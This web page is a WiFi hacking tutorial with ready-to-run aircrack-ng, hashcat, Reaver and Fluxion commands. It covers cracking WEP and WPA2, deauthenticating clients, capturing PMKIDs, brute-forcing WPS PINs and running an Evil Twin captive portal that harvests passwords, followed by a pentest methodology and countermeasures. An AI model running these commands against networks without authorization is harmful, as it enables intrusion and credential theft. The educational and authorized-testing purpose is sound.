WiFi Hacking

Wireless network security testing involves identifying vulnerabilities in WiFi networks, cracking encryption protocols, and exploiting misconfigurations to assess the security posture of wireless infrastructure.

WEP WPA WPA2 WPA3
Legal Warning

Accessing WiFi networks without authorization is illegal under computer fraud and wiretapping laws worldwide. Only test wireless networks that you own or have explicit written permission to test. This content is for educational and authorized security testing purposes only.

Encryption Protocols

WiFi security protocols and their vulnerability status.

WEP

Wired Equivalent Privacy (1997). Uses RC4 stream cipher with 24-bit IV. Completely broken — can be cracked in minutes regardless of password complexity.

Broken
WPA

WiFi Protected Access (2003). Uses TKIP with RC4. Improved over WEP but TKIP has known vulnerabilities. Dictionary attacks possible on weak passwords.

Vulnerable
WPA2

WiFi Protected Access 2 (2004). Uses AES-CCMP encryption. Current standard. Vulnerable to KRACK attack and dictionary/brute force on weak passwords.

Mostly Secure
WPA3

WiFi Protected Access 3 (2018). Uses SAE (Dragonfly) handshake. Forward secrecy, 192-bit security suite. Protected against offline dictionary attacks.

Strongest

WEP Cracking
Breaking Wired Equivalent Privacy encryption

WEP is completely broken and can be cracked regardless of password complexity. The attack exploits weak IV (Initialization Vector) implementation.

Step 1: Start Capture
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w wep_capture wlan0mon
Step 2: Generate Traffic (Fake Authentication)
aireplay-ng -1 0 -a TARGET_BSSID wlan0mon
Step 3: ARP Replay Attack
aireplay-ng -3 -b TARGET_BSSID wlan0mon
Step 4: Crack the Key
aircrack-ng wep_capture-01.cap
Note

You typically need ~40,000-85,000 captured IVs for a successful WEP crack. The ARP replay attack accelerates IV collection.

WPA/WPA2 Cracking
Attacking WPA/WPA2-PSK with 4-way handshake capture

WPA/WPA2-PSK can be attacked by capturing the 4-way handshake and performing offline dictionary/brute force attacks against it.

Step 1: Target the Network
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w wpa_capture wlan0mon
Step 2: Deauthenticate a Client (Force Handshake)
aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
Step 3: Verify Handshake Captured

Look for "WPA handshake: TARGET_BSSID" in the top-right corner of airodump-ng.

Step 4: Crack with Aircrack-ng (Dictionary)
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap
Alternative: Crack with Hashcat (GPU Accelerated)
hcxpcapngtool -o hash.hc22000 wpa_capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
Alternative: PMKID Attack (Clientless)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid_hash.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
PMKID Advantage

The PMKID attack doesn't require capturing a handshake or deauthenticating clients. It works by capturing the PMKID from the first EAPOL frame sent by the AP.

Evil Twin Attack
Rogue access point for credential harvesting

An Evil Twin attack creates a fake access point mimicking a legitimate network. Victims connect to it, and the attacker captures credentials through a captive portal.

Using Fluxion (Automated Tool)
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion && sudo ./fluxion.sh
Manual Setup with hostapd
hostapd evil_twin.conf
dnsmasq -C dnsmasq.conf
aireplay-ng -0 0 -a TARGET_BSSID wlan0mon
How It Works:
  • Create a fake AP with the same SSID as the target
  • Deauthenticate clients from the real AP
  • Clients reconnect to the stronger fake AP
  • Present a captive portal requesting the WiFi password
  • Verify the captured password against the real AP's handshake
WPS PIN Attack
Exploiting WiFi Protected Setup

WiFi Protected Setup (WPS) uses an 8-digit PIN for easy connection. The PIN can be brute-forced because it's validated in two halves (4+3 digits + checksum = ~11,000 attempts).

Scan for WPS-Enabled Networks
wash -i wlan0mon
Brute Force WPS PIN with Reaver
reaver -i wlan0mon -b TARGET_BSSID -vv
Pixie Dust Attack (Faster)
reaver -i wlan0mon -b TARGET_BSSID -vv -K 1
Alternative: Bully
bully -b TARGET_BSSID -c CHANNEL wlan0mon

WiFi Pentesting Methodology

Structured approach to wireless security assessments.

1
Reconnaissance

Scan for wireless networks using airodump-ng or Kismet. Identify SSIDs, BSSIDs, channels, encryption types, connected clients, and signal strength. Map the wireless environment.

2
Identify Targets & Vulnerabilities

Analyze discovered networks for weak encryption (WEP), WPS enabled, weak passwords, hidden networks, and misconfigured access points. Prioritize targets by risk.

3
Capture Handshake / Data

Capture the WPA 4-way handshake by deauthenticating a client, or collect WEP IVs through traffic injection. For WPS, attempt PIN brute force or Pixie Dust attack.

4
Crack the Password

Use aircrack-ng (CPU) or Hashcat (GPU) with wordlists like rockyou.txt. Apply rule-based mutations for complex passwords. Benchmark cracking speed.

5
Post-Exploitation & Pivoting

After gaining access, scan the internal network, perform MITM attacks, access shared resources, and test for lateral movement opportunities.

6
Reporting

Document all findings including network details, vulnerabilities discovered, successful attacks, evidence, risk ratings, and remediation recommendations.

Countermeasures

How to secure wireless networks against attacks.

Encryption & Authentication

• Use WPA3 (or WPA2-AES minimum)
• Never use WEP — it's completely broken
• Set long, complex passwords (20+ chars)
• Use 802.1X / RADIUS for enterprise
• Implement EAP-TLS with certificates
• Change default admin credentials

Access Point Hardening

• Disable WPS — vulnerable to PIN attacks
• Disable SSID broadcast (limited benefit)
• Enable MAC filtering (can be bypassed)
• Reduce TX power to limit coverage area
• Use separate VLANs for guest WiFi
• Keep firmware updated on all APs

Monitoring & Detection

• Deploy Wireless IDS/IPS (WIDS/WIPS)
• Monitor for rogue access points
• Detect deauthentication attacks
• Use 802.11w (PMF) to protect mgmt frames
• Conduct regular wireless audits
• Implement NAC (Network Access Control)
